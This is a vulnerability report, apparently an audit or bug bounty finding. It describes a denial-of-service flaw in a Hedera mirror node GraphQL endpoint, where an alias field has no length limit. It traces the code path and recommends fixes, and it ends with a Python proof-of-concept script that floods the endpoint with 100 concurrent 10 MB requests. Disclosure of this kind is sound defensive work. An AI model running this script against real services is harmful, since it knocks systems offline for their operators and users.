### Title
Unbounded Alias Length Enables DoS via Heap Exhaustion and DB Connection Pool Saturation in `getByAliasAndType()`

### Summary
The GraphQL `AccountInput.alias` field is validated only for character set (`^[A-Z2-7]+$`) with no upper-bound length constraint. An unauthenticated attacker can submit arbitrarily long valid base32 strings, causing `decodeBase32()` to allocate proportionally large byte arrays on the heap and `findByAlias()` to hold DB connections for the duration of each query. Flooding the endpoint with concurrent such requests exhausts JVM heap memory and the DB connection pool, resulting in a full service denial.

### Finding Description
**Code path:**

1. `account.graphqls` line 90 — the only validation on `alias` is:
   ```
   alias: String @Pattern(regexp: "^[A-Z2-7]+$")
   ```
   This regex enforces valid base32 characters but imposes **no maximum length**. The `directive.graphqls` defines only `@Min` and `@Pattern` — there is no `@Size` directive available or applied.

2. `AccountController.java` line 47–48 — the validated (but length-unchecked) alias is passed directly to the service:
   ```java
   return entityService.getByAliasAndType(alias, EntityType.ACCOUNT).map(accountMapper::map);
   ```

3. `EntityServiceImpl.java` line 29–31 — no length guard before decoding:
   ```java
   public Optional<Entity> getByAliasAndType(String alias, EntityType type) {
       return entityRepository.findByAlias(decodeBase32(alias)).filter(e -> e.getType() == type);
   }
   ```

4. `GraphQlUtils.java` line 83–85 — `decodeBase32()` is a bare pass-through with no size check:
   ```java
   public static byte[] decodeBase32(String base32) {
       return BASE32.decode(base32);
   }
   ```
   Apache Commons Codec `Base32.decode()` allocates a `byte[]` of size `⌊(inputLength × 5) / 8⌋`. A 10 MB alias string produces a ~6.25 MB byte array per request.

5. `EntityRepository.java` line 13–14 — the full byte array is sent as a parameter to the DB:
   ```java
   @Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
   Optional<Entity> findByAlias(byte[] alias);
   ```

**Root cause:** The `@Pattern` directive validates only the alphabet of the alias, not its length. No `@Size` constraint, no HTTP body size limit, and no application-level length guard exist anywhere in the path from the GraphQL input to the DB call.

**Why existing checks fail:** The `@Pattern(regexp: "^[A-Z2-7]+$")` check is satisfied by any string of any length composed entirely of uppercase A–Z and 2–7 characters. It does not reject a 50 MB string of `AAAA...`.

### Impact Explanation
- **Heap exhaustion:** Each request with a multi-megabyte alias allocates a proportionally large `byte[]`. With a thread pool of N concurrent requests, heap consumption is `N × (inputLength × 5/8)` bytes. A modest 100 concurrent requests each carrying a 10 MB alias string allocates ~6.25 GB of heap, triggering OOM and crashing the JVM.
- **DB connection pool exhaustion:** Each request holds a JDBC connection for the duration of the `findByAlias` query. Sending thousands of requests saturates the connection pool, blocking all other legitimate DB operations across the entire mirror node GraphQL service.
- **Severity:** Critical — full service denial achievable by an unauthenticated external user with no special privileges.

### Likelihood Explanation
The GraphQL endpoint is publicly accessible with no authentication required for account queries. The attack requires only an HTTP client capable of sending concurrent requests with a large JSON body. No exploit code, credentials, or insider knowledge are needed. The attack is trivially repeatable and automatable (e.g., with `curl`, `ab`, or any load-testing tool). The absence of any rate limiting or request-size cap in the graphql module makes this straightforwardly exploitable.

### Recommendation
1. **Add a `@Size` directive** to the GraphQL schema and apply it to `alias`:
   ```graphql
   directive @Size(max: Int! = 2147483647, message: String = "graphql.validation.Size.message")
     on ARGUMENT_DEFINITION | INPUT_FIELD_DEFINITION
   ```
   Then in `account.graphqls`:
   ```graphql
   alias: String @Pattern(regexp: "^[A-Z2-7]+$") @Size(max: 100)
   ```
   The maximum valid Hedera alias is a 32-byte Ed25519 public key encoded as base32 = 56 characters (no padding). A limit of 100 characters is generous and safe.

2. **Add a length guard in `decodeBase32()`** as a defense-in-depth measure:
   ```java
   public static byte[] decodeBase32(String base32) {
       if (base32 != null && base32.length() > 100) {
           throw new IllegalArgumentException("Alias exceeds maximum allowed length");
       }
       return BASE32.decode(base32);
   }
   ```

3. **Configure HTTP request body size limits** in Spring Boot application properties to cap the maximum request size.

### Proof of Concept
```python
import requests
import threading

# Generate a valid base32 string of 10MB (all valid [A-Z2-7] chars)
alias = "A" * 10_000_000

query = """
{
  "query": "{ account(input: { alias: \\"%s\\" }) { id } }"
}
""" % alias

url = "http://<mirror-node-graphql-host>/graphql"

def send():
    requests.post(url, data=query, headers={"Content-Type": "application/json"})

# Launch 100 concurrent requests
threads = [threading.Thread(target=send) for _ in range(100)]
for t in threads: t.start()
for t in threads: t.join()
# Expected result: OOM crash or DB connection pool exhaustion; service becomes unresponsive
